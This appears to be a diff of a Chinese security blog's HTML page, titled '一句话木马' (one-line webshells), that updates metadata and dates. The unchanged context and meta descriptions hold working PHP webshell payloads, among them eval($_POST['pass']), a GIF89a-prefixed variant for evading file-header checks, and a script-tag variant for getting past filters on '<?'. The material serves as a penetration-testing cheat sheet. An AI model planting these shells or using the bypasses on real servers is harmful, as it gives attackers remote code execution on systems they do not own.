@@ -92,14 +92,14 @@
 
 
 
-<meta name="description" content="总结一下常用的一句话木马,‘@’这个符号是为了屏蔽报错 PHP(eval用法和assert一样)1&lt;?php @eval($_POST[&#39;pass&#39;]);?&gt; 绕过文件头检测 12GIF89a&lt;?php @eval($_POST[&#39;pass&#39;]);?&gt;">
+<meta name="description" content="总结一下常用的一句话木马,‘@’这个符号是为了屏蔽报错 PHP(eval用法和assert一样)1&lt;?php @eval($_POST[&#39;pass&#39;]);?&gt; 绕过文件头检测 12GIF89a&lt;?php @eval($_POST[&#39;pass&#39;]);?&gt; 过滤了”&lt;?”,利用js调用php 1&lt;script language&#x3D;&quot;php&quot;&gt;eval($_POS">
 <meta property="og:type" content="article">
 <meta property="og:title" content="一句话木马">
 <meta property="og:url" content="http://www.zxfireworks.xyz/post/b7e0f698.html">
 <meta property="og:site_name" content="w1ndy">
-<meta property="og:description" content="总结一下常用的一句话木马,‘@’这个符号是为了屏蔽报错 PHP(eval用法和assert一样)1&lt;?php @eval($_POST[&#39;pass&#39;]);?&gt; 绕过文件头检测 12GIF89a&lt;?php @eval($_POST[&#39;pass&#39;]);?&gt;">
+<meta property="og:description" content="总结一下常用的一句话木马,‘@’这个符号是为了屏蔽报错 PHP(eval用法和assert一样)1&lt;?php @eval($_POST[&#39;pass&#39;]);?&gt; 绕过文件头检测 12GIF89a&lt;?php @eval($_POST[&#39;pass&#39;]);?&gt; 过滤了”&lt;?”,利用js调用php 1&lt;script language&#x3D;&quot;php&quot;&gt;eval($_POS">
 <meta property="article:published_time" content="2020-07-16T10:43:15.000Z">
-<meta property="article:modified_time" content="2020-07-16T11:51:39.520Z">
+<meta property="article:modified_time" content="2020-11-22T13:23:03.905Z">
 <meta property="article:author" content="w1ndy">
 <meta name="twitter:card" content="summary">
 
@@ -342,8 +342,8 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2020-07-16T19:51:39+08:00">
-                2020-07-16
+              <time title="更新于" itemprop="dateModified" datetime="2020-11-22T21:23:03+08:00">
+                2020-11-22
               </time>
             
           </span>
@@ -412,7 +412,6 @@
 <h3 id="PHP-eval用法和assert一样"><a href="#PHP-eval用法和assert一样" class="headerlink" title="PHP(eval用法和assert一样)"></a>PHP(eval用法和assert一样)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @<span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">'pass'</span>]);?&gt;</span><br></pre></td></tr></table></figure>
 <p>绕过文件头检测</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;?php @<span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">'pass'</span>]);?&gt;</span><br></pre></td></tr></table></figure>
-<a id="more"></a>
 <p>过滤了”&lt;?”,利用js调用php</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">"php"</span>&gt;<span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">'pass'</span>]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
 <p>过滤了”php”,短标签绕过</p>
@@ -550,7 +549,7 @@
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">49</span>
+                  <span class="site-state-item-count">44</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
